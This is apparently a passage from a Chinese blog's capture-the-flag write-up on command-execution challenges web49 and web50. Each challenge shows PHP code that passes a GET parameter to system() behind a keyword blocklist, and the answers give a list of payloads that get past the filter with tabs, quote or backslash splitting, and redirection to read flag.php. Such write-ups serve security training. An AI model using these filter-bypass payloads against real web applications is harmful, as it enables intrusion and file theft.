<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><h3 id="题目：-6"><a href="#题目：-6" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-6"><a href="#解答：-6" class="headerlink" title="解答："></a>解答：</h3><p>用之前的payload也行，贴一下大佬的一排payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:c&#x3D;nl%09fla\g.php||</span><br><span class="line">payload2:c&#x3D;nl%09fla\g.php%0a</span><br><span class="line">payload3:c&#x3D;nl%09fla&#39;&#39;g.php%0a</span><br><span class="line">payload4:c&#x3D;nl%09fla&quot;&quot;g.php%0a</span><br><span class="line">payload5:c&#x3D;vi%09fla\g.php%0a</span><br><span class="line">payload6:c&#x3D;tac%09fla\g.php%0a</span><br><span class="line">payload7:c&#x3D;uniq%09fla\g.php%0a</span><br><span class="line">payload8:c&#x3D;nl&lt;fla&#39;&#39;g.php||</span><br><span class="line">payload9:c&#x3D;nl%09fla\g.php%26</span><br></pre></td></tr></table></figure>
<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><h3 id="题目：-7"><a href="#题目：-7" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-7"><a href="#解答：-7" class="headerlink" title="解答："></a>解答：</h3><p>paylaod1:<code>?c=tac&lt;&gt;fla\g.php||</code></p>
<p>payload2:<code>c=nl&lt;fla\g.php||</code></p>
<p>注意点：&lt;&gt;和?一起使用时没有回显,所以这里的？可以用反斜杠进行代替</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
</search>
